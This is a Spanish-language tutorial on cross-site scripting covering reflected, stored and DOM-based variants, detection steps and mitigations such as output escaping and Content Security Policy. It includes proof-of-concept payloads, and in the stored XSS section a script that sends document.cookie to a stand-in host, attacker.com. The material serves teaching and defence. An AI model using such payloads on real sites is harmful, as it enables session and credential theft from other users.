# Cross-Site Scripting

## 📊 Qué es Cross-Site Scripting

\*\*Cross-site scripting \*\* es una vulnerabilidad de seguridad web que permite a un atacante inyectar scripts maliciosos en sitios web que otros usuarios visualizan. Estos scripts se ejecutan en el navegador de la víctima, dentro del contexto del sitio vulnerable, y pueden acceder a cookies, sesiones, tokens de autenticación o incluso realizar acciones en nombre del usuario.

XSS rompe el **Same-Origin Policy (SOP)**, una política de seguridad fundamental del navegador que impide que scripts de un origen accedan a datos de otro origen.

### 🔧 Cómo funciona

Un atacante manipula una aplicación vulnerable para que devuelva código JavaScript malicioso. Cuando un usuario accede a la página, el navegador ejecuta ese script, lo que permite al atacante:

* Suplantar la identidad del usuario
* Acceder a datos privados
* Realizar acciones como si fuera la víctima
* Robar credenciales o tokens

### 🔍 Prueba de concepto&#x20;

Una forma clásica de probar XSS es usar el siguiente payload:

```html
<script>alert(1)</script>
```

Sin embargo, desde Chrome 92, algunos contextos (como iframes cross-origin) bloquean `alert()`. En esos casos, se puede usar:

```html
<script>print()</script>
```

o alternativas más discretas como:

```html
<img src=x onerror="console.log('XSS')">
```

---

## 🧵 Tipos de XSS

Existen **tres tipos principales de XSS**, cada uno con características específicas:

### 1. Reflected XSS

La carga maliciosa proviene directamente de la **petición HTTP** y es reflejada de inmediato en la respuesta.

#### 🔹 Ejemplo:

```
https://inseguro.com/status?msg=<script>alert(1)</script>
```

Si la página devuelve:

```html
<p>Status: <script>alert(1)</script></p>
```

el script se ejecuta en el navegador del usuario.

#### 🔒 Prevención:

* Escapar correctamente los datos de entrada.
* Validar y sanear los parámetros recibidos por GET o POST.

### 2. Stored XSS (Persistente)

El script malicioso es almacenado en el servidor (base de datos, logs, etc.) y servido a múltiples usuarios.

#### 🔹 Ejemplo:

Un usuario publica un comentario:

```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

Cuando otro usuario accede a la página de comentarios, el script se ejecuta.

#### 🔒 Prevención:

* Sanitizar datos antes de almacenarlos.
* Escapar al renderizar contenido de usuarios.

### 3. DOM-based XSS

Ocurre cuando el código JavaScript del lado cliente (DOM) usa entradas del usuario sin validación.

#### 🔹 Ejemplo:

```js
let search = location.hash.substring(1);
document.getElementById("output").innerHTML = "Buscaste: " + search;
```

URL maliciosa:

```
https://inseguro.com/#<img src=x onerror=alert(1)>
```

#### 🔒 Prevención:

* Evitar manipular el DOM con datos no confiables.
* Usar `textContent` en lugar de `innerHTML`.

---

## 🔋 Impacto de un ataque XSS

El impacto depende de los privilegios del usuario y la naturaleza de la aplicación:

* 🌎 Sitios informativos: bajo impacto
* 💳 Sitios bancarios o con datos sensibles: alto impacto
* 👤 Cuentas admin comprometidas: acceso total a la app y usuarios

Un atacante puede:

* Robar sesiones
* Cambiar la interfaz (defacement)
* Robar credenciales
* Cargar scripts persistentes (keyloggers, payloads de C2)

---

## ⚖️ Cómo encontrar XSS

### Reflected / Stored

1. Inyectar un string único como `abc123` en los parámetros.
2. Ver si aparece en la respuesta HTML.
3. Probar payloads específicos en ese contexto.

### DOM-based

1. Inyectar un marcador (`aaa`) en la URL o campo controlado.
2. Usar las DevTools para buscar si aparece en el DOM.
3. Si se refleja sin escape en `innerHTML`, es vulnerable.

### Automatización

* Burp Suite Scanner
* OWASP ZAP
* DOM Invader (Burp)

---

## 🤝 Diferencias clave con otras vulnerabilidades

| Vulnerabilidad | Afecta   | Objetivo         | Ejecución             |
| -------------- | -------- | ---------------- | --------------------- |
| **XSS**        | Cliente  | Otro usuario     | En navegador          |
| **CSRF**       | Cliente  | El servidor      | Acciones no deseadas  |
| **SQLi**       | Servidor | La base de datos | Consultas manipuladas |

---

## 🛎 Estrategias de mitigación

### ✅ 1. Filtro de entrada (input validation)

Validar lo que entra, según el contexto esperado. Usar listas blancas si es posible.

### ✅ 2. Escape de salida (output encoding)

Dependiendo del contexto:

* HTML: `&lt;`, `&gt;`, `&amp;`, `&quot;`
* JavaScript: codificación Unicode (`\u003c`)
* URLs: `encodeURIComponent()`

### ✅ 3. Cabeceras HTTP seguras

* `Content-Type`: `text/plain` si no se espera HTML
* `X-Content-Type-Options: nosniff`
* `X-XSS-Protection: 1; mode=block` (obsoleto, pero aún usado)

### ✅ 4. Content Security Policy (CSP)

Permite restringir de dónde puede cargarse código.
Ejemplo:

```http
Content-Security-Policy: script-src 'self'; object-src 'none';
```

### ✅ 5. Uso de frameworks seguros

React, Angular, Vue hacen escape automático de variables en el DOM.

---

## 🤔 Preguntas frecuentes

* ❓ **¿XSS es común?**
  Sí, es una de las vulnerabilidades más frecuentes.

* ❓ **¿Es fácil de explotar?**
  En muchos casos sí, especialmente si no hay filtros adecuados.

* ❓ **¿Cómo prevenir XSS en PHP/Java?**

  * PHP: `htmlentities($input, ENT_QUOTES)`
  * Java: usar bibliotecas como **OWASP Java Encoder** o **Guava**

---

## 📖 Recursos recomendados

* [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
* [XSS Cheat Sheet (OWASP)](https://owasp.org/www-community/xss-prevention)
* [DOMPurify - librería para sanitizar HTML](https://github.com/cure53/DOMPurify)
* [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---
